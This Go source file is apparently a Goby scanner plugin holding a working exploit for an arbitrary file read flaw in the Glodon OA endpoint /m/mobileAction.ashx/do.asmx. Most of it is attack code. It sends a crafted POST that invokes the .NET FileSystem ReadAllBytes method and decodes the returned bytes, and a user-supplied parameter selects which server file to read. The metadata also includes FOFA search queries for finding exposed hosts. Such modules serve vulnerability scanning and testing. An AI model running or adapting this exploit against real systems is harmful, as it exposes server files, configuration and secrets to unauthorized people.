package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Glodon OA system interface /m/mobileAction.ashx/do.asmx File Read Vulnerability",
    "Description": "<p>Glodon Technology Co., Ltd. is a listed software company, based on the field of construction engineering, focusing on the whole life cycle of engineering projects, providing professional applications in the field of construction engineering as the core basic support, and industrial big data, industrial credit, industrial finance and other value-added services. The company's business covers eight major sectors: engineering construction, engineering information, engineering cost, engineering education, e-government, e-commerce, Internet finance and investment</p>",
    "Product": "Glodon OA system",
    "Homepage": "https://www.glodon.com/",
    "DisclosureDate": "2024-10-23",
    "PostTime": "2024-10-24",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "(body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\") && body=\"系统提示\"",
    "GobyQuery": "(body=\"Services/Identification/login.ashx\" || header=\"Services/Identification/login.ashx\" || banner=\"Services/Identification/login.ashx\") && body=\"系统提示\"",
    "Level": "1",
    "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.</p>",
    "Recommendation": "<p>1. Let web users only access (read) the files and paths they need  </p><p> 2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities</p><p> 3. Make it impossible for users to access paths other than the root directory of the web.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/%E5%B9%BF%E8%81%94%E8%BE%BEOA/%E5%B9%BF%E8%81%94%E8%BE%BEOA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3do.asmx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "广联达OA系统接口 /m/mobileAction.ashx/do.asmx 文件读取漏洞",
            "Product": "广联达OA系统",
            "Description": "<p>广联达科技股份有限公司是一家上市软件公司，立足建设工程领域，围绕工程项目的全生命周期，提供以建设工程领域专业应用为核心基础支撑，以产业大数据、产业征信、产业金融等为增值服务。 公司业务涵盖工程施工、工程信息、工程造价、工程教育、电子政务、电子商务、互联网金融与投资八大板块<br></p>",
            "Recommendation": "<p>1、让web 用户只能访问（读取），所需要的文件和路径&nbsp;</p><p>2、不能有文件包含漏洞，目录遍历漏洞或其他漏洞</p><p>&nbsp;3、让用户不能访问Web 根目录以外的路径。<br></p>",
            "Impact": "<p>下载服务器任意文件，包括源代码文件、系统敏感文件、配置文件等等。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Glodon OA system interface /m/mobileAction.ashx/do.asmx File Read Vulnerability",
            "Product": "Glodon OA system",
            "Description": "<p>Glodon Technology Co., Ltd. is a listed software company, based on the field of construction engineering, focusing on the whole life cycle of engineering projects, providing professional applications in the field of construction engineering as the core basic support, and industrial big data, industrial credit, industrial finance and other value-added services. The company's business covers eight major sectors: engineering construction, engineering information, engineering cost, engineering education, e-government, e-commerce, Internet finance and investment<br></p>",
            "Recommendation": "<p>1. Let web users only access (read) the files and paths they need&nbsp;&nbsp;</p><p>&nbsp;2. There can be no file containing vulnerabilities, directory traversal vulnerabilities or other vulnerabilities</p><p>&nbsp;3. Make it impossible for users to access paths other than the root directory of the web.<br></p>",
            "Impact": "<p>Download any server files, including source code files, sensitive system files, configuration files, and more.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

	postOrGet_m9jXTEDGmn := func(hostInfo *httpclient.FixUrl, fileName string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig("/m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=ReadAllBytes")
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = `["\"C:\\\\Windows\\\\` + fileName + `\""]`
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "*/*",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Accept-Encoding": "gzip, deflate, br",
			"Connection":      "close",
		}

		resp, err := setPostRequest(hostInfo, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		// 使用正则表达式提取 Data 部分
		re := regexp.MustCompile(`"Data":\[(.*?)\]`)
		matches := re.FindStringSubmatch(resp.RawBody)

		if len(matches) < 2 {
			return "", errors.New("无匹配字符")
		}
		// 获取 Data 部分并去掉空格
		dataString := strings.TrimSpace(matches[1])
		// 分割成字符串数组
		dataValues := strings.Split(dataString, ",")
		// 将 ASCII 值转换为字符串
		var decodedString strings.Builder
		for _, value := range dataValues {
			asciiValue, err := strconv.Atoi(strings.TrimSpace(value))
			if err != nil {
				return "", err
			}
			decodedString.WriteByte(byte(asciiValue))
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return decodedString.String(), nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/m/mobileAction.ashx/do.asmx"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"win.ini": "fonts",
			}
			// 函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"default": {"win.ini", "fonts"},
			}

			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_m9jXTEDGmn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "敏感信息泄露\n" + resp
			return expResult
		},
	))
}
